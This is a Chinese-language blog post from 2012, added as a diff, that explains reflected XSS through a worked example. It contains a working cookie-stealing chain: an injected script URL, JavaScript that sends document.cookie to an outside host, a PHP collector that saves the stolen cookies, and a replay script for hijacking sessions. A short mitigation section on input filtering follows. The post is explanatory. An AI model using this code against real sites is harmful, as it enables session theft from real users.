@@ -1,0 +1,87 @@
+---
+author: qicfan
+comments: true
+date: 2012-01-16 10:29:21+00:00
+layout: post
+slug: '%e6%81%b6%e5%bf%83%e7%9a%84xss%e8%b7%a8%e7%ab%99%e6%94%bb%e5%87%bb'
+title: 恶心的XSS跨站攻击
+wordpress_id: 371
+categories:
+- 技术杂谈
+tags:
+- xss
+- 跨站
+- 跨站脚本攻击
+---
+
+所谓的XSS，也就是大家熟知的跨站脚本攻击，不知道的自己谷歌充电去。XSS足够隐蔽，尤其是对一些没有经验的程序员，可能很难发现，下面举个例子：
+网站a.com有用户登陆功能，并且可以保存用户登陆信息；还有一个搜索功能，搜索的URL类似这样:http://a.com/search?keyword=keyword，一般来说keywod我们都会显示在页面上，如果有一个粗心的程序员偷懒了，直接echo $_GET['keyword']，那么一个XSS漏洞便诞生了，怎么利用这个漏洞呢，很简单我们将keyword写成一个JS调用比如：http://a.com/search?keyword=<script type='text/javascript' src='http://b.com/xss.js'></script>，这样这个script就完整的显示在页面上了，该搜索页面就调用了b.com的一个JS文件。
+
+这个JS文件有啥用呢？有点常识的同学都知道JS能取到COOKIE，前面我们已经铺垫了，a.com可以允许用户保持在线，这个时候我们的JS文件就可以将用户当前登陆的COOKIE发送到http://b.com/xss.php，嗯，发送到我们的一个PHP文件，这个PHP文件可以将发送过来的cookie记录到数据库或者写入到文件里，留待我们日后使用，下面上点简单的代码：
+
+http://b.com/xss.php
+
+    
+    /**
+     * http://b.com/xss.js
+     * 这里没有调用jquery，但是这些代码依赖jquery，所以需要的朋友请加上jquery调用
+     */
+    String.prototype.trim= function(){ 
+    	return this.replace(/(^\s*)|(\s*$)/g, "");  
+    }
+    var cookies = document.cookie;
+    cookies = cookies.split(';');
+    var new_cookie = '';
+    for (var i=0; i<cookies.length; i++) {
+    	var c = cookies[i];
+    	c = c.trim();
+    	new_cookie += '&' + c;
+    }
+    new_cookie = new_cookie.substring(1);
+    var xssurl = "http://10.9.23.136/xss.php?" + new_cookie;
+    var xssjs = $("<script src=""+xssurl+"" type="text/javascript"></script>");
+    $('body').append(xssjs);
+
+
+http://b.com/xss.php
+
+    
+    /**
+     * http://b.com/xss.php
+     * 这里将传递过来的用户的cookie写入到文件中保存，留待日后使用
+     */
+    // 得到所有的cookie并且序列化
+    $data = serialize($_GET);
+    // 生成存储的文件名
+    $file = md5(time()). '.txt';
+    // 写入文件
+    file_put_contents($file, $data);
+
+
+经过上面两步，我们得到了用户的cookie，如果该点击这个url的用户刚好登陆过，并且记录了登陆信息，那么我们就很幸运了，下面讲讲怎么使用我们得到的这写cookie，首先我们要写一个脚本setcookie.php，然后我们修改hosts文件，做一个127.0.0.1 a.com的解析，是a.com解析为127.0.0.1，这样我们就可以很方便的在本地写入a.com的cookie，下面是setcookie.php的脚本：
+
+    
+    /**
+     * http://a.com/setcookie.php.php(即http://127.0.0.1/setcookie.php)
+     * 这里将cookie写入到a.com的域中（其实是本地操作）
+     */
+    // 文件名取前面保存在目录下的文件
+    $data = file_get_contents('asdf132423adf2342341.txt');
+    // 反序列话得到cookie数组
+    $data = unserialize($data);
+    // 写入cookie
+    foreach ($data as $k=>$v) {
+    	setcookie($k, $v, 0, '/', '.a.com');
+    }
+
+
+好了，现在访问a.com，是不是发现你已经作为某用户登陆了呢？嘿嘿，这就是一个简单的XSS跨站脚本攻击的雏形，利用起来很简单，有点编程经验的人就可以写攻击代码。
+
+下面说说解决的方法：
+做码农的都知道不信任客户端的任何数据，但是我们有时候就是记不住这跳金科玉律，不做过滤就输出那是常事儿；所以我们只要保证对所有经手客户端的数据进行过滤就可以解决这个问题；跨站脚本攻击，脚本都无法执行，怎么攻击，其实就这么简单。
+
+话说回来，现在看来一个好的框架，确实能省不少的事儿，大部分的框架都可以实现在最前端对参数进行过滤帮助粗心的程序员解决问题，当然特殊需求除外。
+
+好了，就说这么多，大家多注意哦。
+
+
